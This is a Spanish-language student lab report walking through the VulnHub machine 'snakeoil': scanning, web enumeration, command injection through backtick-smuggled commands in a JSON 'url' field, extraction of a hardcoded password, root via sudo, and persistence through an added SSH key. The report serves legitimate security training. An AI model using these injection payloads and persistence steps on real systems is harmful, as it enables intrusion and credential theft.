01

Objetivo de la Práctica

Demostrar la capacidad de aplicar conocimientos teóricos de seguridad informática en un entorno práctico, mediante la realización de un walkthrough detallado sobre la máquina vulnerable digitalworld.local: snakeoil de VulnHub. El objetivo incluye el reconocimiento, enumeración, explotación, escalada de privilegios y post-explotación, documentando cada fase y relacionando las técnicas utilizadas con los fundamentos teóricos de ciberseguridad.

02

Desarrollo

Se realizó un pentest completo siguiendo las fases metodológicas de reconocimiento, enumeración, explotación y post-explotación sobre la máquina Snakeoil.

Fase de Preparación y Reconocimiento

Se configuró el entorno en red Host-Only y se identificó la máquina objetivo.

sudo arp-scan -l
nmap -sV -p 22,80,8080 192.168.56.100 192.168.56.103
nmap -sC -sV -p- -T4 -oA snakeoil_full 192.168.56.103

Estos comandos permitieron descubrir la IP de la víctima (192.168.56.103) y confirmar los servicios abiertos: SSH (22), HTTP (80) y la aplicación Flask (8080).

Enumeración Web

gobuster dir -u http://192.168.56.103:8080 -w /usr/share/wordlists/dirb/common.txt -t 40

Se descubrieron endpoints interesantes como /users, /registration, /login, /run y /secret.

Fase de Explotación

Se registró un usuario y se obtuvo un token JWT:

curl -X POST http://192.168.56.103:8080/registration -d "username=hacker&password=hacker123"
curl -X POST http://192.168.56.103:8080/login -d "username=hacker&password=hacker123"

Con el token se obtuvo la secret_key:

curl http://192.168.56.103:8080/secret -H "Cookie: access_token_cookie=TOKEN_AQUI"

Se explotó Command Injection en el endpoint /run:

curl -X POST http://192.168.56.103:8080/run \
  -H "Content-Type: application/json" \
  -d '{"url":"127.0.0.1:80`id`","secret_key":"commandexecutionissecret"}'

curl -X POST http://192.168.56.103:8080/run \
  -H "Content-Type: application/json" \
  -d '{"url":"127.0.0.1:80`grep -E "SECRET_KEY|PASSWORD|password|JWT" /home/patrick/flask_blog/app.py`","secret_key":"commandexecutionissecret"}'

Se extrajo la contraseña del usuario patrick: NOreasonableDOUBTthisPASSWORDisGOOD

Acceso Inicial y Escalada de Privilegios

ssh patrick@192.168.56.103
whoami
id
cat ~/local.txt
sudo -l
sudo su -
whoami
id
cat /root/proof.txt

Se obtuvo acceso como patrick y posteriormente se escaló a root gracias a los privilegios sudo (ALL:ALL).

Fase de Post-Explotación

Se demostró control del sistema y se estableció persistencia:

uname -a
hostname

# En Kali
ssh-keygen -t ed25519 -f snakeoil_root -N ""
cat snakeoil_root.pub

# En la máquina objetivo (como root)
mkdir -p /root/.ssh
echo "CLAVE_PUBLICA" >> /root/.ssh/authorized_keys
chmod 700 /root/.ssh
chmod 600 /root/.ssh/authorized_keys

# Verificación desde Kali
ssh -i snakeoil_root root@192.168.56.103
whoami
id
cat /root/proof.txt
03

Conclusiones

La práctica permitió aplicar de forma integral la metodología de pentesting, desde el reconocimiento hasta la post-explotación. Se identificaron vulnerabilidades críticas en la aplicación Flask (método HTTP incorrecto, exposición de secretos, Command Injection y reutilización de contraseñas), lo que facilitó el compromiso completo del sistema.

Se evidenció la importancia de validar correctamente las entradas de usuario, no hardcodear secretos en el código fuente y configurar adecuadamente los privilegios de sudo. El ejercicio reforzó la relación entre los conceptos teóricos de seguridad ofensiva y su aplicación práctica en un entorno controlado.
